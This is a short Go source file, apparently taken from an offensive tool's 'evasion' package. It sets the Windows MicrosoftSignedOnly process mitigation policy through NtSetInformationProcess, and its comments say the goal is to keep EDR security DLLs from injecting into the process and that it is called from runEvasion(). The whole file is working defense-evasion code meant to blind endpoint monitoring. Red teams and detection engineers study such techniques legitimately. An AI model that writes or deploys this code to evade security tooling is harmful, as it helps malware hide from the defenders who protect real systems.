//go:build windows
// +build windows

package evasion

import "unsafe"

// blockNonMicrosoftDLLs sets ProcessSignatureMitigationPolicy (MicrosoftSignedOnly)
// on the current process via NtSetInformationProcess, preventing EDR DLLs from
// injecting into this process after startup.
//
// This is the runtime equivalent of the creation-time flag
// PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON.
//
// Call this last in runEvasion(), after all initialization is complete, so
// legitimate third-party DLLs loaded earlier are unaffected.
func blockNonMicrosoftDLLs() {
	p := getNtSetInfoProc()
	if p == nil {
		return
	}
	const (
		processMitigationPolicy         = 52 // PROCESSINFOCLASS: ProcessMitigationPolicy
		processSignatureMitigationPolicy = 8  // PROCESS_MITIGATION_POLICY: ProcessSignatureMitigationPolicy
	)
	// PROCESS_MITIGATION_POLICY_INFORMATION { Policy: 8, Flags: 1 (MicrosoftSignedOnly) }
	var info [2]uint32
	info[0] = processSignatureMitigationPolicy
	info[1] = 1
	p.Call(
		ntCurrentProcess,
		processMitigationPolicy,
		uintptr(unsafe.Pointer(&info[0])),
		unsafe.Sizeof(info),
	)
}
